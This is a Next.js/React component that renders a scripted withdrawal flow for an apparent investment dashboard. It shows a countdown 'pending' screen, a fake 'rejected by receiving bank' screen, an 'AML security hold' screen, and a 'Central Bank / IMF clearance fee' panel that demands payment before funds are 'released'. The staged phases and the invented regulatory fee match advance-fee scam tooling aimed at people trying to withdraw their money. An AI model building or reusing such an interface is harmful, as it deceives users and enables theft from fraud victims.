"use client";

import { useCallback, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { AnimatePresence, motion } from "framer-motion";
import { Loader2, MessageCircle } from "lucide-react";
import DashboardGate from "@/components/dashboard/DashboardGate";
import Button from "@/components/ui/Button";
import { useI18n } from "@/components/providers/I18nProvider";
import { fetchDashboardJson } from "@/lib/fetch-json";
import { useChat } from "@/components/providers/ChatProvider";
import {
  ScriptCard,
  PendingTimerRing,
  TransferFlowAnimation,
  BankRejectedIllustration,
  SecurityHoldIllustration,
  ImfHoldIllustration,
  StaggerIn,
} from "@/components/dashboard/WithdrawalScriptAnimations";
import WithdrawalMethodIcon from "@/components/dashboard/WithdrawalMethodIcon";
import BankRejectContinueModal from "@/components/dashboard/BankRejectContinueModal";
import { getWithdrawalMethod } from "@/lib/withdrawal-methods";
import { formatReferenceId } from "@/lib/transaction-receipt";
import type { BankRejectFailureCopy, BankTransitCopy } from "@/lib/withdrawal-script-messages";

type ScriptData = {
  withdrawal: {
    id: string;
    amountUsd: number;
    method?: string;
    methodLabel: string;
    scriptPhase: string;
    status: string;
  };
  chargeAmountUsd: number | null;
  imfClearance: { id: string; amountUsd: number; status: string } | null;
  imfClearanceFeePercent: number;
  pendingSecondsRemaining: number;
  pendingSecondsTotal: number;
  securityMessage: string;
  bankRejectFailure?: BankRejectFailureCopy;
  withdrawalScriptStep?: number;
  pendingMode?: "standard" | "bank-transit";
  bankTransit?: BankTransitCopy | null;
  cycleComplete?: boolean;
  intermediateBankReject?: boolean;
};

type View = "pending" | "bank-rejected" | "security-hold" | "imf-clearance";

export default function WithdrawalScriptView({
  withdrawalId,
  view,
}: {
  withdrawalId: string;
  view: View;
}) {
  const router = useRouter();
  const { formatCurrency } = useI18n();
  const { openHumanSupport } = useChat();
  const [data, setData] = useState<ScriptData | null>(null);
  const [loading, setLoading] = useState(true);
  const [secondsLeft, setSecondsLeft] = useState(30);
  const [completing, setCompleting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [bankRejectContinueOpen, setBankRejectContinueOpen] = useState(false);

  const totalSeconds = data?.pendingSecondsTotal ?? 30;

  const load = useCallback(() => {
    setLoading(true);
    fetchDashboardJson<ScriptData>(`/api/dashboard/withdrawals/${withdrawalId}/script`)
      .then(({ data: json, error: fetchError }) => {
        if (fetchError || !json) {
          setError("Could not load withdrawal status.");
          return;
        }
        setData(json);
        setSecondsLeft(json.pendingSecondsRemaining || json.pendingSecondsTotal);
        setError(null);
      })
      .finally(() => setLoading(false));
  }, [withdrawalId]);

  useEffect(() => {
    load();
  }, [load]);

  useEffect(() => {
    if (view !== "pending" || !data || data.withdrawal.scriptPhase !== "PENDING_TIMER") return;

    if (secondsLeft <= 0) {
      if (completing) return;
      setCompleting(true);
      fetch(`/api/dashboard/withdrawals/${withdrawalId}/script`, { method: "POST", credentials: "include" })
        .then(async (res) => {
          const json = await res.json();
          if (!res.ok) throw new Error(json.error || "Confirmation failed");
          if (json.next === "bank-rejected") {
            router.replace(`/dashboard/withdrawals/${withdrawalId}/script/bank-rejected`);
          } else if (json.next === "imf-clearance") {
            router.replace(`/dashboard/withdrawals/${withdrawalId}/script/imf-clearance`);
          } else {
            router.replace("/dashboard/withdrawals");
          }
        })
        .catch((err) => {
          setError(err instanceof Error ? err.message : "Confirmation failed");
          setCompleting(false);
        });
      return;
    }

    const timer = window.setTimeout(() => setSecondsLeft((s) => Math.max(0, s - 1)), 1000);
    return () => window.clearTimeout(timer);
  }, [view, data, secondsLeft, completing, withdrawalId, router]);

  useEffect(() => {
    if (view === "bank-rejected" && data && data.withdrawal.scriptPhase !== "BANK_REJECTED") {
      if (data.withdrawal.scriptPhase === "PENDING_TIMER") {
        router.replace(`/dashboard/withdrawals/${withdrawalId}/script/pending`);
      }
    }
  }, [view, data, router, withdrawalId]);

  return (
    <DashboardGate isLoading={loading}>
      <div className="max-w-xl mx-auto space-y-6">
        <AnimatePresence mode="wait">
          {error && (
            <motion.div
              key="error"
              initial={{ opacity: 0, y: -8 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0 }}
              className="dash-card border border-accent-red/30 bg-accent-red/5 p-4 text-sm text-white"
            >
              {error}
            </motion.div>
          )}
        </AnimatePresence>

        {view === "pending" && data && (
          <ScriptCard className="text-center space-y-6 relative overflow-hidden">
            <AnimatePresence>
              {completing && (
                <motion.div
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  className="absolute inset-0 z-10 flex flex-col items-center justify-center gap-3 bg-bg-primary/80 backdrop-blur-sm rounded-[inherit]"
                >
                  <Loader2 className="h-8 w-8 text-accent-gold animate-spin" />
                  <p className="text-sm text-text-muted">Finalizing secure handoff…</p>
                </motion.div>
              )}
            </AnimatePresence>

            {data.pendingMode === "bank-transit" && data.withdrawal.method ? (
              (() => {
                const methodDef = getWithdrawalMethod(data.withdrawal.method!);
                const transit = data.bankTransit;
                return (
                  <>
                    <PendingTimerRing secondsLeft={secondsLeft} totalSeconds={totalSeconds} />
                    {methodDef && (
                      <div className="flex flex-col items-center gap-2">
                        <WithdrawalMethodIcon method={methodDef} size="lg" className="scale-[1.25]" />
                        <p className="text-xs font-semibold uppercase tracking-widest text-accent-gold">
                          {transit?.institutionLabel ?? data.withdrawal.methodLabel}
                        </p>
                      </div>
                    )}
                    <StaggerIn delay={0.1}>
                      <p className="text-xs uppercase tracking-widest text-accent-gold font-semibold">
                        Transfer in progress
                      </p>
                      <h1 className="text-xl font-bold text-white mt-2">
                        {transit?.title ?? "Your transfer is on its way to the receiving bank"}
                      </h1>
                      <p className="text-sm text-text-muted mt-2 leading-relaxed max-w-sm mx-auto">
                        {transit?.message ??
                          `Your ${formatCurrency(data.withdrawal.amountUsd)} withdrawal is being delivered securely.`}
                      </p>
                    </StaggerIn>
                    <StaggerIn delay={0.22}>
                      <TransferFlowAnimation />
                    </StaggerIn>
                  </>
                );
              })()
            ) : (
              <>
                <PendingTimerRing secondsLeft={secondsLeft} totalSeconds={totalSeconds} />

                <StaggerIn delay={0.1}>
                  <p className="text-xs uppercase tracking-widest text-accent-gold font-semibold">Transaction pending</p>
                  <h1 className="text-xl font-bold text-white mt-2">Confirming with receiving bank</h1>
                  <p className="text-sm text-text-muted mt-2 leading-relaxed max-w-sm mx-auto">
                    Your {formatCurrency(data.withdrawal.amountUsd)} {data.withdrawal.methodLabel} withdrawal is being
                    verified securely.
                  </p>
                </StaggerIn>

                <StaggerIn delay={0.22}>
                  <TransferFlowAnimation />
                </StaggerIn>
              </>
            )}
          </ScriptCard>
        )}

        {view === "bank-rejected" && data && (
          <ScriptCard className="space-y-5">
            {data.bankRejectFailure?.variant === "paypal" && data.withdrawal.method ? (
              (() => {
                const methodDef = getWithdrawalMethod(data.withdrawal.method!);
                if (!methodDef) return <BankRejectedIllustration />;
                return (
                  <div className="flex flex-col items-center gap-3 py-2">
                    <WithdrawalMethodIcon method={methodDef} size="lg" className="scale-[1.35]" />
                    <p className="text-xs font-semibold uppercase tracking-widest text-[#003087] dark:text-[#009cde]">
                      PayPal
                    </p>
                  </div>
                );
              })()
            ) : (
              <BankRejectedIllustration />
            )}
            <StaggerIn delay={0.15}>
              <h1 className="text-xl font-bold text-white text-center">
                {data.bankRejectFailure?.title ?? "Transfer rejected by receiving bank"}
              </h1>
              <p className="text-sm text-text-muted mt-3 leading-relaxed text-center">
                {data.bankRejectFailure?.message ??
                  "The receiving institution returned a temporary system error."}{" "}
                Your withdrawal amount
                {data.chargeAmountUsd ? " and processing fee have" : " has"} been credited back to your account
                balance.
              </p>
            </StaggerIn>
            <StaggerIn delay={0.28}>
              {data.intermediateBankReject ? (
                <>
                  <p className="text-sm text-text-secondary text-center">
                    Choose how you would like to proceed with this withdrawal.
                  </p>
                  <Button className="w-full mt-4" onClick={() => setBankRejectContinueOpen(true)}>
                    Continue
                  </Button>
                </>
              ) : (
                <>
                  <p className="text-sm text-text-secondary text-center">
                    You may submit a new withdrawal when you are ready.
                  </p>
                  <Button className="w-full mt-4" onClick={() => router.push("/dashboard/withdrawals")}>
                    Back to withdrawals
                  </Button>
                </>
              )}
            </StaggerIn>
          </ScriptCard>
        )}

        {view === "security-hold" && data && (
          <ScriptCard className="space-y-5">
            <SecurityHoldIllustration />
            <StaggerIn delay={0.12}>
              <h1 className="text-xl font-bold text-white text-center">Security hold — AML verification required</h1>
              <p className="text-sm text-text-secondary leading-relaxed mt-3">{data.securityMessage}</p>
            </StaggerIn>
            <StaggerIn delay={0.24}>
              <div className="rounded-xl border border-border bg-bg-tertiary/50 p-4 flex items-center gap-3 text-sm overflow-hidden relative">
                <Loader2 className="animate-spin text-accent-gold shrink-0" size={18} />
                <span className="text-text-muted">Identity and transaction verification in progress</span>
              </div>
              <Button variant="outline" className="w-full gap-2 mt-4" type="button" onClick={() => openHumanSupport()}>
                <MessageCircle size={18} />
                Contact support
              </Button>
            </StaggerIn>
          </ScriptCard>
        )}

        {view === "imf-clearance" && (
          <ImfClearancePanel withdrawalId={withdrawalId} formatCurrency={formatCurrency} />
        )}
      </div>

      <BankRejectContinueModal
        open={bankRejectContinueOpen}
        onClose={() => setBankRejectContinueOpen(false)}
        onNewWithdrawal={() => {
          setBankRejectContinueOpen(false);
          router.push("/dashboard/withdrawals#withdraw-form");
        }}
        onContactSupport={() => {
          setBankRejectContinueOpen(false);
          const ref = formatReferenceId(withdrawalId);
          try {
            sessionStorage.setItem(
              "br-support-prefill",
              `Hello, my withdrawal was declined by the receiving bank and I need assistance (ref ${ref}).`
            );
          } catch {
            /* ignore */
          }
          openHumanSupport();
        }}
      />
    </DashboardGate>
  );
}

function ImfClearancePanel({
  withdrawalId,
  formatCurrency,
}: {
  withdrawalId: string;
  formatCurrency: (n: number) => string;
}) {
  const router = useRouter();
  const [loading, setLoading] = useState(true);
  const [imfAmount, setImfAmount] = useState(0);
  const [withdrawalAmount, setWithdrawalAmount] = useState(0);
  const [imfStatus, setImfStatus] = useState<string>("UNPAID");

  useEffect(() => {
    fetch(`/api/dashboard/withdrawals/${withdrawalId}/imf-clearance`, { credentials: "include" })
      .then((r) => r.json())
      .then((json) => {
        if (json.imfPayment) {
          setImfAmount(json.imfPayment.amountUsd);
          setImfStatus(json.imfPayment.status);
          setWithdrawalAmount(json.withdrawal?.amountUsd ?? 0);
        }
      })
      .finally(() => setLoading(false));
  }, [withdrawalId]);

  if (loading) {
    return (
      <ScriptCard className="flex flex-col items-center justify-center py-12 gap-3">
        <Loader2 className="animate-spin text-accent-gold h-8 w-8" />
        <p className="text-xs text-text-muted">Loading clearance details…</p>
      </ScriptCard>
    );
  }

  return (
    <ScriptCard className="space-y-5">
      <ImfHoldIllustration />
      <StaggerIn delay={0.1}>
        <h1 className="text-xl font-bold text-white text-center">Central Bank / IMF clearance fee</h1>
        <p className="text-sm text-text-secondary leading-relaxed text-center mt-2">
          Regulatory clearance is required before your {formatCurrency(withdrawalAmount)} transfer can be released.
          Pay the clearance fee below to continue.
        </p>
      </StaggerIn>
      <StaggerIn delay={0.2}>
        <motion.div
          className="rounded-xl border border-accent-gold/30 bg-accent-gold/5 p-4 text-center"
          whileHover={{ scale: 1.01 }}
          transition={{ type: "spring", stiffness: 400, damping: 28 }}
        >
          <p className="text-xs uppercase tracking-wide text-text-muted">Clearance fee due</p>
          <p className="text-2xl font-bold text-accent-gold mt-1">{formatCurrency(imfAmount)}</p>
        </motion.div>
      </StaggerIn>
      {imfStatus === "PENDING_VERIFICATION" ? (
        <StaggerIn delay={0.3} className="space-y-3">
          <p className="text-sm text-text-secondary text-center leading-relaxed">
            Your {formatCurrency(imfAmount)} clearance payment has been submitted and is awaiting verification.
          </p>
          <Button variant="outline" className="w-full" onClick={() => router.push("/dashboard/withdrawals")}>
            Back to withdrawals
          </Button>
        </StaggerIn>
      ) : (
        <StaggerIn delay={0.3} className="space-y-3">
          <Button className="w-full" onClick={() => router.push(`/dashboard/withdrawals/${withdrawalId}/imf-clearance/pay`)}>
            Pay clearance fee
          </Button>
          <Button variant="outline" className="w-full" onClick={() => router.push("/dashboard/withdrawals")}>
            Back to withdrawals
          </Button>
        </StaggerIn>
      )}
    </ScriptCard>
  );
}
